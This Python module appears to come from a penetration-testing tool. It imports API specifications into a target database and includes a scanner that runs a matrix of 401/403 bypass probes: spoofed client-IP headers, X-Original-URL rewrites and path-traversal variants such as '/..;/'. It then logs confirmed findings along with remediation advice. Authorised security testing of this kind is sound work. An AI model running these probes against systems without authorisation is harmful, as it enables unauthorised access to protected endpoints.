"""
PROXSYNTH — 1-Click API Schema Importer & Gateway Bypass Engine
Imports and parses OpenAPI/Swagger specifications (JSON or YAML) directly into the Target Knowledge Graph,
and executes autonomous API Gateway 401/403 access control bypass matrices.
"""

import json
import logging
import urllib.parse
from typing import Dict, List, Any, Optional, Tuple, Set

import httpx
import yaml

from backend.database import SessionLocal, TargetAsset, TargetEndpoint, HttpLog, Finding
from backend.target_manager import upsert_target_asset, add_or_update_endpoint
from backend.user_agents import get_random_user_agent

logger = logging.getLogger("proxynth.api_importer")


def generate_mock_value(schema: Dict[str, Any], depth: int = 0) -> Any:
    """Generates synthetic fuzzing values based on JSON schema property types."""
    if depth > 3:
        return "..."
    t = schema.get("type", "string")
    if t == "string":
        fmt = schema.get("format", "")
        if fmt == "email":
            return "test@target.local"
        elif fmt == "uuid":
            return "00000000-0000-0000-0000-000000000000"
        elif fmt in ("date", "date-time"):
            return "2026-01-01T00:00:00Z"
        return schema.get("example") or "FUZZ_VALUE"
    elif t in ("integer", "number"):
        return schema.get("example") if schema.get("example") is not None else 1
    elif t == "boolean":
        return True
    elif t == "array":
        items = schema.get("items", {})
        return [generate_mock_value(items, depth + 1)]
    elif t == "object":
        props = schema.get("properties", {})
        res = {}
        for k, v in list(props.items())[:10]:
            res[k] = generate_mock_value(v, depth + 1)
        return res
    return "FUZZ"


async def import_api_schema(
    spec_source: str,
    target_base_url: Optional[str] = None,
    project: str = "default",
    headers: Optional[Dict[str, str]] = None,
    base_url: Optional[str] = None
) -> Dict[str, Any]:
    """
    Imports and maps OpenAPI 2.0/3.x, Postman v2.0/v2.1, GraphQL Introspection, or HAR v1.2
    specifications (from URL or raw string content) into structured endpoints and testable
    attack templates in the Target Knowledge Graph.
    """
    target_base_url = target_base_url or base_url
    raw_content = ""
    target_project = (project or "default").strip().lower()

    # 1. Fetch from URL or read raw string
    if spec_source.startswith(("http://", "https://")):
        req_headers = {"User-Agent": get_random_user_agent()}
        if headers:
            req_headers.update(headers)
        async with httpx.AsyncClient(verify=False, timeout=8.0) as client:
            res = await client.get(spec_source, headers=req_headers)
            res.raise_for_status()
            raw_content = res.text
            if not target_base_url:
                parsed_u = urllib.parse.urlparse(spec_source)
                target_base_url = f"{parsed_u.scheme}://{parsed_u.netloc}"
    else:
        raw_content = spec_source.strip()

    # 2. Parse JSON or YAML
    spec_data: Dict[str, Any] = {}
    try:
        spec_data = json.loads(raw_content)
    except json.JSONDecodeError:
        try:
            spec_data = yaml.safe_load(raw_content)
        except Exception as e:
            raise ValueError(f"Failed to parse API specification as JSON or YAML: {e}")

    if not isinstance(spec_data, dict):
        raise ValueError("Invalid specification structure: root must be an object.")

    # 3. Detect Format
    fmt = "OPENAPI"
    if "paths" in spec_data or "openapi" in spec_data or "swagger" in spec_data:
        fmt = "OPENAPI"
    elif "item" in spec_data and isinstance(spec_data["item"], list):
        fmt = "POSTMAN"
    elif "__schema" in spec_data or ("data" in spec_data and isinstance(spec_data["data"], dict) and "__schema" in spec_data["data"]):
        fmt = "GRAPHQL"
    elif "log" in spec_data and "entries" in spec_data["log"]:
        fmt = "HAR"

    # 4. Determine Base Host / URL
    title = spec_data.get("info", {}).get("title", f"Imported {fmt} Spec") if isinstance(spec_data.get("info"), dict) else f"Imported {fmt} Spec"
    version = spec_data.get("info", {}).get("version", "1.0.0") if isinstance(spec_data.get("info"), dict) else "1.0.0"

    base_url = target_base_url or ""
    if not base_url:
        servers = spec_data.get("servers", [])
        if servers and isinstance(servers, list) and servers[0].get("url"):
            base_url = servers[0]["url"]
        elif spec_data.get("host"):
            schemes = spec_data.get("schemes", ["https"])
            base_url = f"{schemes[0]}://{spec_data['host']}{spec_data.get('basePath', '')}"

    if not base_url:
        base_url = "https://api.target.local"

    parsed_base = urllib.parse.urlparse(base_url)
    clean_host = parsed_base.netloc or "api.target.local"

    # Ingest target asset
    try:
        upsert_target_asset(
            project=target_project,
            host=clean_host,
            notes=f"{fmt} Spec: {title} v{version}"
        )
    except Exception:
        pass

    imported_endpoints: List[Dict[str, Any]] = []

    # 5a. PARSER: OpenAPI / Swagger
    if fmt == "OPENAPI":
        paths = spec_data.get("paths", {})
        for path, path_item in paths.items():
            if not isinstance(path_item, dict):
                continue

            for method in ["get", "post", "put", "delete", "patch", "options"]:
                op = path_item.get(method)
                if not op or not isinstance(op, dict):
                    continue

                param_names: List[str] = []
                params = op.get("parameters", []) + path_item.get("parameters", [])
                for p in params:
                    if isinstance(p, dict) and p.get("name"):
                        param_names.append(p["name"])

                body_template: Optional[Dict[str, Any]] = None
                rb = op.get("requestBody", {})
                if isinstance(rb, dict):
                    content = rb.get("content", {})
                    json_schema = content.get("application/json", {}).get("schema", {})
                    if json_schema:
                        body_template = generate_mock_value(json_schema)
                        if isinstance(body_template, dict):
                            param_names.extend(list(body_template.keys()))

                param_names = list(set(param_names))
                full_endpoint_url = urllib.parse.urljoin(base_url, path.lstrip("/"))
                summary = op.get("summary") or op.get("operationId") or f"{method.upper()} {path}"
                auth_req = bool(op.get("security", spec_data.get("security", [])))

                try:
                    add_or_update_endpoint(
                        project=target_project,
                        host=clean_host,
                        url=full_endpoint_url,
                        method=method.upper(),
                        parameters=param_names,
                        auth_required=auth_req,
                        tested_status="DISCOVERED",
                        notes=f"{summary} | Body: {json.dumps(body_template)[:100] if body_template else 'None'}"
                    )
                except Exception:
                    pass

                imported_endpoints.append({
                    "path": path,
                    "method": method.upper(),
                    "url": full_endpoint_url,
                    "parameters": param_names,
                    "auth_required": auth_req,
                    "summary": summary,
                    "body_template": body_template
                })

    # 5b. PARSER: Postman Collection v2.0 / v2.1
    elif fmt == "POSTMAN":
        def _parse_postman_items(items: list) -> list:
            eps = []
            for it in items:
                if not isinstance(it, dict):
                    continue
                if "item" in it and isinstance(it["item"], list):
                    eps.extend(_parse_postman_items(it["item"]))
                elif "request" in it and isinstance(it["request"], dict):
                    req = it["request"]
                    m = req.get("method", "GET").upper()
                    u_obj = req.get("url", "")
                    raw_u = ""
                    p_names = []
                    if isinstance(u_obj, str):
                        raw_u = u_obj
                    elif isinstance(u_obj, dict):
                        raw_u = u_obj.get("raw", "")
                        for q in u_obj.get("query", []):
                            if isinstance(q, dict) and q.get("key"):
                                p_names.append(q["key"])

                    body_template = None
                    b_obj = req.get("body", {})
                    if isinstance(b_obj, dict):
                        raw_b = b_obj.get("raw", "")
                        if raw_b:
                            try:
                                body_template = json.loads(raw_b)
                                if isinstance(body_template, dict):
                                    p_names.extend(list(body_template.keys()))
                            except Exception:
                                pass

                    if raw_u.startswith("http://") or raw_u.startswith("https://"):
                        full_u = raw_u
                    else:
                        full_u = urllib.parse.urljoin(base_url, raw_u.lstrip("/"))

                    p_path = urllib.parse.urlparse(full_u).path or "/"
                    eps.append({
                        "path": p_path,
                        "method": m,
                        "url": full_u,
                        "parameters": list(set(p_names)),
                        "auth_required": bool(req.get("auth")),
                        "summary": it.get("name") or f"{m} {p_path}",
                        "body_template": body_template
                    })
            return eps

        postman_eps = _parse_postman_items(spec_data.get("item", []))
        for ep in postman_eps:
            try:
                add_or_update_endpoint(
                    project=target_project,
                    host=urllib.parse.urlparse(ep["url"]).netloc or clean_host,
                    url=ep["url"],
                    method=ep["method"],
                    parameters=ep["parameters"],
                    auth_required=ep["auth_required"],
                    tested_status="DISCOVERED",
                    notes=f"Postman: {ep['summary']}"
                )
            except Exception:
                pass
            imported_endpoints.append(ep)

    # 5c. PARSER: GraphQL Introspection JSON
    elif fmt == "GRAPHQL":
        schema = spec_data.get("__schema") or spec_data.get("data", {}).get("__schema", {})
        types = schema.get("types", [])
        graphql_url = urllib.parse.urljoin(base_url, "/graphql")

        query_type_name = schema.get("queryType", {}).get("name", "Query")
        mutation_type_name = schema.get("mutationType", {}).get("name", "Mutation")

        for t in types:
            t_name = t.get("name")
            if t_name in (query_type_name, mutation_type_name):
                op_type = "query" if t_name == query_type_name else "mutation"
                for field in t.get("fields", []) or []:
                    f_name = field.get("name")
                    args = [a.get("name") for a in field.get("args", []) if a.get("name")]
                    op_summary = f"GraphQL {op_type.upper()}: {f_name}({', '.join(args)})"

                    try:
                        add_or_update_endpoint(
                            project=target_project,
                            host=clean_host,
                            url=f"{graphql_url}?op={f_name}",
                            method="POST",
                            parameters=args,
                            auth_required=True,
                            tested_status="DISCOVERED",
                            notes=op_summary
                        )
                    except Exception:
                        pass

                    imported_endpoints.append({
                        "path": f"/graphql?op={f_name}",
                        "method": "POST",
                        "url": f"{graphql_url}?op={f_name}",
                        "parameters": args,
                        "auth_required": True,
                        "summary": op_summary,
                        "body_template": {"query": f"{op_type} {{ {f_name} }}"}
                    })

    # 5d. PARSER: HAR (HTTP Archive)
    elif fmt == "HAR":
        entries = spec_data.get("log", {}).get("entries", [])
        seen_keys = set()
        for e in entries:
            req = e.get("request", {})
            m = req.get("method", "GET").upper()
            u = req.get("url", "")
            if not u or not (u.startswith("http://") or u.startswith("https://")):
                continue

            parsed_u = urllib.parse.urlparse(u)
            ep_key = (m, parsed_u.netloc, parsed_u.path)
            if ep_key in seen_keys:
                continue
            seen_keys.add(ep_key)

            p_names = [q.get("name") for q in req.get("queryString", []) if q.get("name")]
            body_template = None
            pd = req.get("postData", {})
            if pd and pd.get("text"):
                try:
                    body_template = json.loads(pd["text"])
                    if isinstance(body_template, dict):
                        p_names.extend(list(body_template.keys()))
                except Exception:
                    pass

            p_names = list(set(p_names))
            try:
                add_or_update_endpoint(
                    project=target_project,
                    host=parsed_u.netloc,
                    url=u.split("?")[0],
                    method=m,
                    parameters=p_names,
                    auth_required=any(h.get("name", "").lower() in ("authorization", "cookie") for h in req.get("headers", [])),
                    tested_status="DISCOVERED",
                    notes=f"HAR Imported from browser session capture"
                )
            except Exception:
                pass

            imported_endpoints.append({
                "path": parsed_u.path,
                "method": m,
                "url": u,
                "parameters": p_names,
                "auth_required": False,
                "summary": f"HAR: {m} {parsed_u.path}",
                "body_template": body_template
            })

    return {
        "status": "completed",
        "format_detected": fmt,
        "schema_format": fmt,
        "api_title": title,
        "api_version": version,
        "base_url": base_url,
        "endpoints_count": len(imported_endpoints),
        "endpoints_imported": len(imported_endpoints),
        "endpoints": imported_endpoints[:50],
        "summary": f"Successfully parsed {fmt} specification and ingested {len(imported_endpoints)} API endpoints into Target Knowledge Graph."
    }


async def audit_api_gateway_bypass(
    target_url: str,
    project: str = "default",
    headers: Optional[Dict[str, str]] = None
) -> Dict[str, Any]:
    """
    Evaluates protected API endpoints returning 401 or 403 against a comprehensive matrix
    of API Gateway bypass headers, URL rewriting, and path traversal normalization bugs.
    """
    target_project = (project or "default").strip().lower()
    parsed_url = urllib.parse.urlparse(target_url)
    clean_path = parsed_url.path or "/"
    clean_host = parsed_url.netloc

    base_headers = {
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*"
    }
    if headers:
        base_headers.update(headers)

    # 1. Establish Baseline Request
    baseline_status = 0
    baseline_len = 0
    async with httpx.AsyncClient(verify=False, timeout=5.0, follow_redirects=False) as client:
        try:
            base_res = await client.get(target_url, headers=base_headers)
            baseline_status = base_res.status_code
            baseline_len = len(base_res.text)
        except Exception as e:
            return {
                "status": "error",
                "target_url": target_url,
                "message": f"Failed to connect to target URL: {e}"
            }

    # Probes definition: (Probe Name, Custom URL, Custom Headers)
    probes: List[Tuple[str, str, Dict[str, str]]] = [
        # IP / Internal header spoofing
        ("Header X-Forwarded-For: 127.0.0.1", target_url, {"X-Forwarded-For": "127.0.0.1"}),
        ("Header X-Real-IP: 127.0.0.1", target_url, {"X-Real-IP": "127.0.0.1"}),
        ("Header X-Custom-IP-Authorization: 127.0.0.1", target_url, {"X-Custom-IP-Authorization": "127.0.0.1"}),
        ("Header X-Originating-IP: 127.0.0.1", target_url, {"X-Originating-IP": "127.0.0.1"}),
        ("Header Client-IP: 127.0.0.1", target_url, {"Client-IP": "127.0.0.1"}),
        ("Header X-Forwarded-Host: localhost", target_url, {"X-Forwarded-Host": "localhost"}),
        
        # URL Rewrite / Routing override
        (f"Header X-Original-URL: {clean_path}", f"{parsed_url.scheme}://{clean_host}/", {"X-Original-URL": clean_path}),
        (f"Header X-Rewrite-URL: {clean_path}", f"{parsed_url.scheme}://{clean_host}/", {"X-Rewrite-URL": clean_path}),
        
        # Path normalization & Semicolon Matrix Traversal
        ("Trailing Slash Bypass", f"{target_url.rstrip('/')}/", {}),
        ("Dot-Slash Bypass (/./)", f"{parsed_url.scheme}://{clean_host}/{clean_path.lstrip('/').replace('/', '/./', 1)}", {}),
        ("Semicolon Parameter Bypass (Tomcat/Spring)", f"{target_url.rstrip('/')};/", {}),
        ("Traversal Matrix Bypass (/..;/)", f"{parsed_url.scheme}://{clean_host}/api/..;{clean_path}", {}),
        ("Extension Suffix (.json)", f"{target_url.rstrip('/')}.json", {}),
        ("Double Slash Bypass (//)", f"{parsed_url.scheme}://{clean_host}//{clean_path.lstrip('/')}", {})
    ]

    successful_bypasses: List[Dict[str, Any]] = []

    async with httpx.AsyncClient(verify=False, timeout=5.0, follow_redirects=False) as client:
        for name, probe_url, probe_headers in probes:
            merged_headers = dict(base_headers)
            merged_headers.update(probe_headers)

            try:
                res = await client.get(probe_url, headers=merged_headers)
                status = res.status_code
                content_len = len(res.text)

                # Detection criteria:
                # 1. Baseline was 401 or 403, and probe yielded 200, 204, or 302
                # 2. Or status changed significantly and response payload expanded
                is_bypass = False
                if baseline_status in (401, 403) and status in (200, 204, 302):
                    is_bypass = True
                elif baseline_status != 200 and status == 200 and content_len > 100:
                    is_bypass = True

                if is_bypass:
                    successful_bypasses.append({
                        "technique": name,
                        "probe_url": probe_url,
                        "probe_headers": probe_headers,
                        "status_code": status,
                        "baseline_status": baseline_status,
                        "content_length": content_len,
                        "response_preview": res.text[:300]
                    })
            except Exception:
                pass

    # If any bypass succeeded, automatically register a CONFIRMED Finding in SQLite
    if successful_bypasses:
        db = SessionLocal()
        try:
            top_bypass = successful_bypasses[0]
            log_entry = HttpLog(
                project=target_project,
                source="GATEWAY_BYPASS_ENGINE",
                method="GET",
                url=top_bypass["probe_url"],
                host=clean_host,
                path=clean_path,
                status_code=top_bypass["status_code"],
                request_headers=json.dumps(top_bypass["probe_headers"]),
                response_body=top_bypass["response_preview"],
                flag_status="CONFIRMED",
                reasoning=f"API Gateway access control bypass confirmed using {top_bypass['technique']}"
            )
            db.add(log_entry)
            db.flush()

            finding_rec = Finding(
                log_id=log_entry.id,
                title=f"API Gateway Authorization Bypass on {clean_path}",
                severity="HIGH",
                category="BROKEN_ACCESS_CONTROL",
                evidence=f"Baseline Status: {baseline_status} -> Probe Status: {top_bypass['status_code']}\nTechnique: {top_bypass['technique']}\nHeaders: {top_bypass['probe_headers']}",
                description=f"The endpoint {clean_path} returned 401/403 forbidden during standard requests, but permitted access when evaluated with API gateway proxy headers or URL path traversal variations.",
                remediation="Ensure upstream reverse proxies, CDNs, and API Gateways (Kong, Nginx, Envoy) strip unverified X-Forwarded-* and X-Original-URL headers before routing traffic to backend microservices."
            )
            db.add(finding_rec)
            db.commit()
        except Exception as e:
            db.rollback()
            logger.warning(f"Failed to record API Gateway bypass finding: {e}")
        finally:
            db.close()

    return {
        "status": "completed",
        "target_url": target_url,
        "baseline_status": baseline_status,
        "probes_evaluated": len(probes),
        "bypasses_found_count": len(successful_bypasses),
        "successful_bypasses": successful_bypasses,
        "is_vulnerable": bool(successful_bypasses)
    }
